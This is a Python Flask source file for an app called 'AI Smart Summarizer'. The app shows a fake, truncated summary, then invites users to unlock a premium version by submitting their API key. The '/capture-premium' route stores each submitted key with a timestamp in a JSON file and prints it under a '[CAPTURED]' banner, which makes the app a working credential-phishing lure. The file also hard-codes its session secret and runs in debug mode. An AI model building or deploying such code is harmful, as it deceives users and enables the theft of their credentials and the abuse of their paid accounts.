import os
import json
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = "summarizer-secret-key-2024"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_FILE = os.path.join(BASE_DIR, "captured_premium.json")


def ensure_capture_file():
    """Create the capture file if it doesn't exist."""
    if not os.path.exists(CAPTURE_FILE):
        with open(CAPTURE_FILE, "w") as f:
            json.dump({"entries": []}, f, indent=2)


def generate_summary(text):
    """Generate a fake summary by extracting the first few sentences."""
    sentences = []
    current = ""
    for char in text:
        current += char
        if char in ".!?":
            sentences.append(current.strip())
            current = ""
    if current.strip():
        sentences.append(current.strip())

    # Return first 2-3 sentences as summary
    summary_sentences = sentences[:3]
    return " ".join(summary_sentences)


def truncate_summary(summary):
    """Truncate the summary to show only a partial preview."""
    words = summary.split()
    if len(words) > 25:
        return " ".join(words[:25]) + "..."
    return summary


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/summarize", methods=["POST"])
def summarize():
    text = request.form.get("text", "")
    if not text.strip():
        return redirect(url_for("index"))

    full_summary = generate_summary(text)
    truncated = truncate_summary(full_summary)

    session["full_summary"] = full_summary
    session["truncated_summary"] = truncated

    return render_template("result.html", summary=truncated)


@app.route("/result")
def result():
    truncated = session.get("truncated_summary", "No summary available.")
    return render_template("result.html", summary=truncated)


@app.route("/premium")
def premium():
    return render_template("premium.html")


@app.route("/capture-premium", methods=["POST"])
def capture_premium():
    api_key = request.form.get("api_key", "")

    ensure_capture_file()

    with open(CAPTURE_FILE, "r") as f:
        data = json.load(f)

    entry = {
        "api_key": api_key,
        "timestamp": datetime.now().isoformat()
    }

    data["entries"].append(entry)

    with open(CAPTURE_FILE, "w") as f:
        json.dump(data, f, indent=2)

    print(f"\n[CAPTURED] Premium data received:")
    print(f"  API Key: {api_key}")
    print(f"  Time:    {entry['timestamp']}\n")

    return redirect(url_for("success"))


@app.route("/success")
def success():
    return render_template("success.html")


if __name__ == "__main__":
    ensure_capture_file()
    print("=" * 50)
    print("  AI Smart Summarizer — Running on http://127.0.0.1:5000")
    print("=" * 50)
    app.run(debug=True, port=5000)
